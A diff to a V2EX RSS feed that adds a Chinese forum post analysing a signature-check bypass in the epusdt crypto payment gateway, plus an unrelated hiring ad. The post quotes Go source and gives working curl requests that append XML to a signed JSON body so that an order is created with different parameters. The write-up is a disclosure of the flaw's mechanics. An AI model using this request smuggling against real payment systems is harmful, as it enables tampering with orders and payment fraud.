@@ -4,6 +4,152 @@
 <title>V2EX - 酷工作</title>
 <link>https://www.v2ex.com/</link>
 
+<item>
+<title>[程序员] epusdt 没啥用的漏洞</title>
+<link>https://www.v2ex.com/t/1092263</link>
+<guid>https://www.v2ex.com/t/1092263</guid>
+<content:encoded><![CDATA[
+
+<p><strong>省流：不能零元购</strong></p>
+<p>先看一看这一段检查签名的 middleware：</p>
+<pre><code>// https://github.com/assimon/epusdt/blob/master/src/middleware/check_sign.go
+
+func CheckApiSign() echo.MiddlewareFunc {
+	return func(next echo.HandlerFunc) echo.HandlerFunc {
+		return func(ctx echo.Context) error {
+            
+			// 先读取所有 Body 内容
+			params, err := ioutil.ReadAll(ctx.Request().Body)
+			if err != nil {
+				return constant.SignatureErr
+			}
+            
+            
+			// 解码 JSON
+			// 注意这里：go 的 json 解码是不管 json 后面的垃圾数据的
+			m := make(map[string]interface{})
+			err = json.Cjson.Unmarshal(params, &amp;m) // err 被忽略了
+            
+			// 这里的 signature 可以是任意类型
+			signature, ok := m["signature"]
+			if !ok {
+				return constant.SignatureErr
+			}
+            
+			// 计算 signature
+			checkSignature, err := sign.Get(m, config.GetApiAuthToken())
+			if err != nil {
+				return constant.SignatureErr
+			}
+            
+			// 虽然 signature 可以是任意类型，但是这里应该是安全的
+			// 因为 go 没有 js 双等于号的自动类型转换
+			if checkSignature != signature {
+				return constant.SignatureErr
+			}
+            
+			// 重置 Body
+			// 注意 JSON 后面的垃圾数据会被保留
+			ctx.Request().Body = ioutil.NopCloser(bytes.NewBuffer(params))
+            
+			return next(ctx)
+		}
+	}
+}
+</code></pre>
+<p>middleware 后面的 controller：</p>
+<pre><code class="language-golang">// https://github.com/assimon/epusdt/blob/master/src/model/request/order_request.go
+
+type CreateTransactionRequest struct {
+	OrderId     string  `json:"order_id" validate:"required|maxLen:32"`
+	Amount      float64 `json:"amount" validate:"required|isFloat|gt:0.01"`
+	NotifyUrl   string  `json:"notify_url" validate:"required"`
+	Signature   string  `json:"signature"  validate:"required"`
+	RedirectUrl string  `json:"redirect_url"`
+}
+</code></pre>
+<pre><code class="language-golang">// https://github.com/assimon/epusdt/blob/master/src/controller/comm/order_controller.go
+
+func (c *BaseCommController) CreateTransaction(ctx echo.Context) (err error) {
+	req := new(request.CreateTransactionRequest)
+    
+	// 这里用到了 echo.Context.Bind
+	if err = ctx.Bind(req); err != nil {
+		return c.FailJson(ctx, constant.ParamsMarshalErr)
+	}
+    
+	if err = c.ValidateStruct(ctx, req); err != nil {
+		return c.FailJson(ctx, err)
+	}
+    
+	resp, err := service.CreateTransaction(req)
+	if err != nil {
+		return c.FailJson(ctx, err)
+	}
+    
+	return c.SucJson(ctx, resp)
+}
+</code></pre>
+<p>echo.Context.Bind 支持多种 mimetype ，所以说应用层可以是 XML 编码，签名是 JSON 编码</p>
+<pre><code class="language-golang">// https://github.com/labstack/echo/blob/9e73691837f52c7fdf4898cbe5bf1d157387bdb0/bind.go#L68
+
+func (b *DefaultBinder) BindBody(c Context, i interface{}) (err error) {
+	req := c.Request()
+	if req.ContentLength &lt;= 0 {
+		return
+	}
+
+	// mediatype is found like `mime.ParseMediaType()` does it
+	base, _, _ := strings.Cut(req.Header.Get(HeaderContentType), ";")
+	mediatype := strings.TrimSpace(base)
+
+	switch mediatype {
+	case MIMEApplicationJSON:
+		
+	case MIMEApplicationXML, MIMETextXML:
+		if err = xml.NewDecoder(req.Body).Decode(i); err != nil {
+			if ute, ok := err.(*xml.UnsupportedTypeError); ok {
+				return NewHTTPError( http.StatusBadRequest, fmt.Sprintf("Unsupported type error: type=%v, error=%v", ute.Type, ute.Error())).SetInternal(err)
+			} else if se, ok := err.(*xml.SyntaxError); ok {
+				return NewHTTPError( http.StatusBadRequest, fmt.Sprintf("Syntax error: line=%v, error=%v", se.Line, se.Error())).SetInternal(err)
+			}
+			return NewHTTPError( http.StatusBadRequest, err.Error()).SetInternal(err)
+		}
+	case MIMEApplicationForm:
+		...
+	case MIMEMultipartForm:
+		...
+	default:
+		return ErrUnsupportedMediaType
+	}
+	return nil
+}
+</code></pre>
+<p>假设我们已经拿到了一个合法的请求：</p>
+<pre><code>curl -d "{\"signature\": \"10744c8a11bcf22851274f7c7222fb4d\", \"amount\": 666.0, \"order_id\": \"2\", \"notify_url\": \"https://example.com\", \"redirect_url\": \"https://example.com\"}" -H "Content-Type: application/json" http://127.0.0.1:8000/api/v1/order/create-transaction
+</code></pre>
+<p>那么就可以把 <code>Content-Type</code> 改称 <code>application/xml</code>，在 JSON 的后面附加上 XML 的请求。检查签名时会忽略后面的 XML 。</p>
+<pre><code>curl -d "{\"signature\": \"10744c8a11bcf22851274f7c7222fb4d\", \"amount\": 666.0, \"order_id\": \"2\", \"notify_url\": \"https://example.com\", \"redirect_url\": \"https://example.com\"}&lt;P&gt;&lt;OrderId&gt;3&lt;/OrderId&gt;&lt;Amount&gt;99.9&lt;/Amount&gt;&lt;NotifyUrl&gt;https://example.com&lt;/NotifyUrl&gt;&lt;RedirectUrl&gt;https://example.com&lt;/RedirectUrl&gt;&lt;Signature&gt;1&lt;/Signature&gt;&lt;/P&gt;" -H "Content-Type: application/xml" http://127.0.0.1:8000/api/v1/order/create-transaction
+
+{"status_code":200,"message":"success","data":{"trade_id":"2024***","order_id":"3","amount":99.9,"actual_amount":13.78,"token":"***","expiration_time":***,"payment_url":"https://example.com/pay/checkout-counter/2024***"},"request_id":"***"}
+</code></pre>
+<p>在检查签名的时候会用到前面的 JSON ，所以这个请求可以通过签名验证。但是在 controller 会把 Body 当成 XML 来解码，所以实际创建的订单的参数是后面的 XML 。</p>
+<p>这个漏洞没啥用，因为一般情况下是拿不到合法的请求的</p>
+]]></content:encoded>
+<pubDate>2024-11-24T21:57:56Z</pubDate>
+<pubDate>2024-11-24T21:56:56Z</pubDate>
+</item>
+<item>
+<title>[酷工作] 诚聘高级人才 || 硅谷科技公司 || Be Part of the Future || Top Silicon Valley Company</title>
+<link>https://www.v2ex.com/t/1092262</link>
+<guid>https://www.v2ex.com/t/1092262</guid>
+<content:encoded><![CDATA[
+
+诚聘高级人才 || 硅谷科技公司 || Be Part of the Future || Top Silicon Valley Company<br /><br />我们是一家位于美国硅谷的科技公司，由硅谷 Palo Alto(Apple, Google, Facebook, Logitech, Tesla, PayPal 等国际公司及 Stanford University 所在地)资深专家和其他国家顶级专家联合创办。<br /> <br />请转发给需要的朋友<br />( <a href="https://imgur.com/a/t0vpwAy" rel="nofollow noopener" target="_blank">https://imgur.com/a/t0vpwAy</a>)<br /><br />本项目与 AI 新模型有关，是虚拟世界中的重要里程碑。<br />本项目将使得多重宇宙成为现实，让我们一起书写历史。<br />项目在在 AGI 方面有授权专利(国际），团队有 30 多年的游戏研发经验(主要是海外游戏, English-Speaking)<br />1 产品合伙人,可以从零到一的产品经理(最好有 AI 项目经验或者游戏项目经验)<br />2 技术合伙人(AI, 全栈等等各个技术方向)，<br />3 艺术总监合伙人(创意舵手，灵感之花，让艺术与商业绽放出璀璨光芒)，<br />4 游戏合伙人(AGI 技术将应用于游戏。正在研发 AI 新模型(已有中美授权专利)，可以用于游戏和电影等领域)<br /><br /><br />总之海纳百川，各种高级人才都要/::D<br />简历请发送到 INFO@MARV.EE<br /><br />请转发给需要的朋友<br />( <a href="https://imgur.com/a/aGyps5s" rel="nofollow noopener" target="_blank">https://imgur.com/a/aGyps5s</a>)<br /><br />--==--==<br />Be Part of the Future || Top Silicon Valley Company<br />We are a tech company located in Silicon Valley, USA, co-founded by senior experts from Palo Alto (home to international companies like Apple, Google, Facebook, Logitech, Tesla, PayPal as well as Stanford University) and other top experts from various countries.<br /><br />This project, which is at the forefront of AI model development, represents a major leap forward in the virtual world.<br />This project will make the multiverse a reality, let us write history together.<br />The project has authorized patents (international) in AGI, and the team has over 30 years of game development experience (mainly overseas games, English-Speaking).<br />1 Product Partner, should be a product manager capable of building from zero to one (preferably with AI project experience or game project experience)<br />2 Technical Co-founders or Entrepreneur (specializing in AI, full-stack development, and various other technical directions)<br />3 Art Director Partners (Creative Helmsmen, Fountain of Inspiration, Where Art and Commerce Flourish)<br />4 Game Partners (Implementing AGI Technology in Games. Developing a New AI Model (Patented in China and the U.S.) Applicable to Games, Films, and More)<br />In general, we welcome all kinds of high-level talents /::D<br /><br />SEND YOUR RESUME TO INFO@MARV.EE<br /><br />Please forward to friends who need this.<br />( <a href="https://imgur.com/a/aGyps5s" rel="nofollow noopener" target="_blank">https://imgur.com/a/aGyps5s</a>)
+]]></content:encoded>
+<pubDate>2024-11-24T21:31:23Z</pubDate>
+<pubDate>2024-11-24T21:30:23Z</pubDate>
+</item>
 
 <item>
 <title>[macOS] 作为一个陆续使用 macOS 超过 12 年的人，这件事真的让我触不及防</title>
